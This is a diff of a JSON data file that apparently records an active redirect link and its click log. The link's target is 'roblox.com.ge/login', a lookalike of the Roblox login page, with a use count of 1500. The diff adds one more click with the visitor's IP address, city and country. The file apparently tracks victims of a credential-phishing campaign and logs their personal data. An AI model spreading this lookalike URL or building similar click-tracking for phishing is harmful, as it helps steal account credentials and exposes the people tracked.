@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1500,
+    "useCount": 1501,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12168,6 +12168,14 @@
         "city": "Chihuahua City",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777443590711,
+        "ip": "92.184.144.196",
+        "country": "France",
+        "city": "Dourgne",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
